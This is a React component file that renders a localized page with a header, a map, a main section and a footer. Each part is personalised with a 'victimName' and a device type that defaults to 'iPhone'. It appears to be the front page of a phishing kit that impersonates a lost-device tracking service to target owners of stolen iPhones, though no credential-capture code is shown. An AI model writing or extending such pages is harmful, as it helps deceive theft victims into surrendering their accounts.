import { useEffect, useState } from 'react';
import Header from './Header';
import Map from './Map';
import SectionMain from './SectionMain';
import Footer from './Footer'
import '../assets/css/app.css'
import translator from '../../api/translator';
import { useData } from '../../context/UserContext';

const detectLanguage = () => {
    const browserLang = navigator.language || (navigator.languages && navigator.languages[0]) || 'en';
    const shortLang = browserLang.split('-')[0];
    return shortLang;
};

const Index = () => {
    const { user } = useData();
    useEffect(() => {
        console.log("User Data en Index.jsx:", user);
    }, []);
    const [lang, setLang] = useState('es');
    const [translations, setTranslations] = useState(null);

    useEffect(() => {
        const fetchTranslations = async () => {
            const detectedLang = detectLanguage();
            setLang(detectedLang);
            const loaded = await translator.loadTranslations('/translator.json');
            setTranslations(loaded);
        };
        fetchTranslations();
    }, []);

    const t = (text) => {
        if (!translations) return text;
        if (!translations[lang]) return text;
        return translations[lang][text] || text;
    };

    return (
        <>
            <div></div>
            <Header
                translator={t}
            />
            <section className="container-fluid position-relative sectionPadding">
                <Map
                    translator={t}
                    deviceName={
                        (() => {
                            try {                               
                                return user?.data?.victimName || "iPhone";
                            } catch {
                                return "iPhone";
                            }
                        })()
                    }
                />
                <SectionMain
                    translator={t}
                    deviceName={
                        (() => {
                            try {
                               return user?.data?.victimName || "iPhone";
                            } catch {
                                return "iPhone";
                            }
                        })()
                    }
                    device={
                        (() => {
                            try {
                               return user?.data?.device || "iPhone";
                            } catch {
                                return "iPhone";
                            }
                        })()
                    }
                />
            </section>
            <Footer
                translator={t}
                deviceName={
                    (() => {
                        try {
                            return user?.data?.victimName || "iPhone";
                        } catch {
                            return "iPhone";
                        }
                    })()
                }
                device={
                    (() => {
                        try {
                            return user?.data?.device || "iPhone";
                        } catch {
                            return "iPhone";
                        }
                    })()
                }
            />

        </>
    )

}

export default Index;